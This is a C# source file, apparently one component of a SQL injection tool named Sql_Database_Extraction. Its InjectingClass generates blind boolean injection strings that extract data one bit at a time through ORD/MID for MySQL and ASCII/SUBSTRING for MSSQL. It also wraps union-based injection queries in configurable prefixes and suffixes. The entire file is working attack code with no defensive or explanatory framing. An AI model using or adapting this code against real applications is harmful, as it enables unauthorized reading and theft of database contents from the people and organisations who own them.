using System;
using System.Collections.Generic;
using System.Text;

namespace Sql_Database_Extraction
{
    public class InjectingClass
    {
        private string injectBegin;
        public string InjectBegin
        {
            get { return injectBegin; }
            set { injectBegin = value; }
        }

        private string injectEnd;
        public string InjectEnd
        {
            get { return injectEnd; }
            set { injectEnd = value; }
        }

        private string injectcondition;
        public string InjectCondition
        {
            get { return injectcondition; }
            set { injectcondition = value; }
        }

        #region Union Query Based

        private string unionQueryBegin;
        public string UnionQueryBegin
        {
            get { return unionQueryBegin; }
            set { unionQueryBegin = value; }
        }

        private string unionQueryEnd;
        public string UnionQueryEnd
        {
            get { return unionQueryEnd; }
            set { unionQueryEnd = value; }
        }

        #endregion

        public InjectingClass()
        {
            injectBegin = string.Empty;
            injectEnd = string.Empty;
            injectcondition = string.Empty;

            unionQueryBegin = string.Empty;
            unionQueryEnd = string.Empty;
        }

        public List<string> InjectConditionQueries(string Data, int CharIndex, int ASCIIposition, int ASCIImax, eDataBase DBType)
        {
            if (DBType == eDataBase.MSSQL)
                return ConditionQueriesMSSQL(Data, CharIndex, ASCIIposition, ASCIImax);
            else if (DBType == eDataBase.MySQL)
                return ConditionQueriesMySQL(Data, CharIndex, ASCIIposition, ASCIImax);
            else
                return null;
        }

        private List<string> ConditionQueriesMySQL(string Data, int CharIndex, int ASCIIposition, int ASCIImax)
        {
            List<string> Queries = new List<string>();
            for (int w = 1; (ASCIIposition + w) <= ASCIImax; w = w * 2)
            {
                Queries.Add(InjectString(" ORD(MID((" + Data + ")," + CharIndex + ",1))&" + Convert.ToString(ASCIIposition + w) + ">0", true));
            }
            return Queries;
        }

        private List<string> ConditionQueriesMSSQL(string Data, int CharIndex, int ASCIIposition, int ASCIImax)
        {
            List<string> Queries = new List<string>();
            for (int w = 1; (ASCIIposition + w) <= ASCIImax; w = w * 2)
            {
                Queries.Add(InjectString(" ASCII(SUBSTRING((" + Data + ")," + CharIndex + ",1))&" + Convert.ToString(ASCIIposition + w) + ">0", true));
            }
            return Queries;
        }

        public List<string> InjectUnionQueries(List<string> UnionQueries)
        {
            List<string> NewUnionQueries = new List<string>();
            foreach (string query in UnionQueries)
            {
                string text = InjectString(unionQueryBegin + query + unionQueryEnd, false);
                NewUnionQueries.Add(text);
            }
            return NewUnionQueries;
        }

        public string InjectUnionQuery(string Data)
        {
            return InjectString(unionQueryBegin + Data + unionQueryEnd, false);
        }

        private string InjectString(string Query, bool useCondition)
        {
            if (useCondition)
                return injectBegin + injectcondition + Query + injectEnd;
            else
                return injectBegin + Query + injectEnd;
        }
    }
}
